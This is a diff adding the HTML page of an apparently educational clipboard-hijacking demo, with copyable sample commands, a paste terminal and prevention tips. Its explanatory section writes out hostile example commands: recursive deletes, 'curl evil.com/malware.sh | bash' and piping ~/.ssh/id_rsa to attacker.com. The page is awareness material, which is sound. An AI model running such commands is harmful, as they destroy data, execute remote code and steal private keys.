@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clipboard Hijacking Attack Simulation</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/movie-style.css">
+</head>
+
+<body>
+    <!-- Simulation Warning Banner -->
+    <div class="simulation-banner">
+        ⚠️ EDUCATIONAL SIMULATION - This is a safe demonstration of clipboard hijacking attacks
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <h1>🔒 Clipboard Hijacking Attack Simulation</h1>
+            <p class="text-muted">Experience how malicious websites can secretly modify what you copy</p>
+
+            <!-- Navigation -->
+            <nav class="nav">
+                <a href="/" class="nav-link">Demo</a>
+                <a href="/prevention" class="nav-link">Prevention Tips</a>
+                <a href="/safety" class="nav-link">Safety & Ethics</a>
+                <a href="/admin" class="nav-link">Admin Logs</a>
+            </nav>
+        </header>
+
+        <!-- Instructions -->
+        <div class="card mb-lg">
+            <h2>📋 How This Works</h2>
+            <p>This demonstration shows how attackers can abuse the clipboard to change commands before you paste them:
+            </p>
+            <ol style="color: var(--text-secondary); margin-left: 1.5rem;">
+                <li><strong>Select and copy</strong> any command below (Ctrl+C or right-click → Copy)</li>
+                <li><strong>Watch</strong> as the "hijacked" version appears on the right</li>
+                <li><strong>Paste</strong> in the terminal area below to see what actually got copied</li>
+                <li><strong>Learn</strong> why you should never blindly copy-paste commands from untrusted sources</li>
+            </ol>
+        </div>
+
+        <!-- Split View: Original vs Modified -->
+        <div class="split-view">
+            <!-- Left Panel: Original Commands -->
+            <div class="panel">
+                <div class="panel-header">
+                    <span class="panel-icon">📄</span>
+                    <h3 class="panel-title">Try Copying These Commands</h3>
+                </div>
+                <p class="text-muted mb-md">Select any command below and press Ctrl+C to copy it:</p>
+
+                <div id="commandsList">
+                    <div class="command-item">
+                        <div class="command-box selectable" data-command="ipconfig /all">
+                            <span class="terminal-prompt">C:\&gt;</span> ipconfig /all
+                        </div>
+                    </div>
+
+                    <div class="command-item">
+                        <div class="command-box selectable" data-command="ls -la">
+                            <span class="terminal-prompt">$</span> ls -la
+                        </div>
+                    </div>
+
+                    <div class="command-item">
+                        <div class="command-box selectable" data-command="Get-Process">
+                            <span class="terminal-prompt">PS&gt;</span> Get-Process
+                        </div>
+                    </div>
+
+                    <div class="command-item">
+                        <div class="command-box selectable" data-command="curl https://example.com/api">
+                            <span class="terminal-prompt">$</span> curl https://example.com/api
+                        </div>
+                    </div>
+
+                    <div class="command-item">
+                        <div class="command-box selectable" data-command="dir C:\Users">
+                            <span class="terminal-prompt">C:\&gt;</span> dir C:\Users
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Right Panel: Modified Commands (Initially Hidden) -->
+            <div class="panel" id="modifiedPanel">
+                <div class="panel-header">
+                    <span class="panel-icon">⚠️</span>
+                    <h3 class="panel-title">What Actually Got Copied</h3>
+                </div>
+
+                <div id="noHijackMessage">
+                    <p class="text-muted">Copy a command from the left to see the hijacked version...</p>
+                </div>
+
+                <div id="hijackResult" class="hidden">
+                    <div class="alert alert-danger mb-md">
+                        <strong>🚨 Clipboard Hijacked!</strong><br>
+                        Your clipboard was modified. Here's what you actually copied:
+                    </div>
+
+                    <div class="comparison-container">
+                        <div class="comparison-item original">
+                            <strong>Original:</strong><br>
+                            <code id="originalCommand"></code>
+                        </div>
+
+                        <div class="comparison-item modified">
+                            <strong>Modified (in clipboard):</strong><br>
+                            <code id="modifiedCommand"></code>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-warning mt-md">
+                        <strong>⚠️ Notice the difference?</strong><br>
+                        The <span class="highlight-danger">dangerous additions</span> were silently added to your
+                        clipboard!
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Demo Terminal / Paste Area -->
+        <div class="card mb-lg">
+            <h2>💻 Test Terminal - Paste Here</h2>
+            <p class="text-muted mb-md">Paste what you copied (Ctrl+V) to see the actual clipboard content:</p>
+
+            <div class="terminal">
+                <div class="terminal-header">
+                    <div class="terminal-dot"></div>
+                    <div class="terminal-dot"></div>
+                    <div class="terminal-dot"></div>
+                </div>
+                <div class="terminal-content">
+                    <span class="terminal-prompt">user@demo:~$</span> <span id="terminalOutput">Waiting for
+                        paste...</span>
+                </div>
+                <textarea id="pasteArea" class="terminal-input"
+                    placeholder="Click here and paste (Ctrl+V) to see what's in your clipboard..."></textarea>
+            </div>
+        </div>
+
+        <!-- Educational Section -->
+        <div class="card mb-lg" id="educationalSection" style="display: none;">
+            <h2>🎓 What Just Happened?</h2>
+            <p>You just experienced a <strong>clipboard hijacking attack</strong>. Here's what happened:</p>
+
+            <div class="alert alert-info">
+                <strong>The Attack:</strong><br>
+                When you copied the command, JavaScript detected the copy event and modified your clipboard content
+                before you pasted it. In a real attack, this could:
+                <ul style="margin-top: 0.5rem; margin-left: 1.5rem;">
+                    <li>Delete important files (<code>rm -rf /</code>, <code>del /s /q C:\</code>)</li>
+                    <li>Download and execute malware (<code>curl evil.com/malware.sh | bash</code>)</li>
+                    <li>Steal sensitive data (<code>cat ~/.ssh/id_rsa | curl -X POST attacker.com</code>)</li>
+                    <li>Create backdoors or modify system settings</li>
+                </ul>
+            </div>
+
+            <h3 class="mt-lg">🛡️ How to Protect Yourself</h3>
+            <div class="comparison-container">
+                <div class="comparison-item original">
+                    <strong>✅ DO:</strong>
+                    <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
+                        <li>Always read commands before pressing Enter</li>
+                        <li>Type commands manually when possible</li>
+                        <li>Use official documentation from trusted sources</li>
+                        <li>Paste into a text editor first to review</li>
+                        <li>Be extra careful with commands containing: <code>rm</code>, <code>del</code>,
+                            <code>curl</code>, <code>wget</code>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="comparison-item modified">
+                    <strong>❌ DON'T:</strong>
+                    <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
+                        <li>Blindly copy-paste commands from random websites</li>
+                        <li>Run commands without understanding them</li>
+                        <li>Trust commands from untrusted sources</li>
+                        <li>Paste directly into terminal without reviewing</li>
+                        <li>Ignore warnings from your system</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="text-center mt-lg">
+                <a href="/prevention" class="btn btn-primary">Learn More Prevention Techniques →</a>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="text-center text-muted mt-xl">
+            <p>⚠️ This is an educational tool for cybersecurity awareness.</p>
+            <p>Never use clipboard hijacking techniques maliciously. <a href="/safety"
+                    style="color: var(--accent-cyan);">Read our safety guidelines</a></p>
+        </footer>
+    </div>
+
+    <!-- JavaScript -->
+    <script src="/js/clipboard-monitor.js"></script>
+    <script src="/js/demo-terminal.js"></script>
+    <script src="/js/event-logger.js"></script>
+    <script src="/js/clipboard-widget.js"></script>
+    <script src="/js/animated-diagram.js"></script>
+</body>
+
+</html>
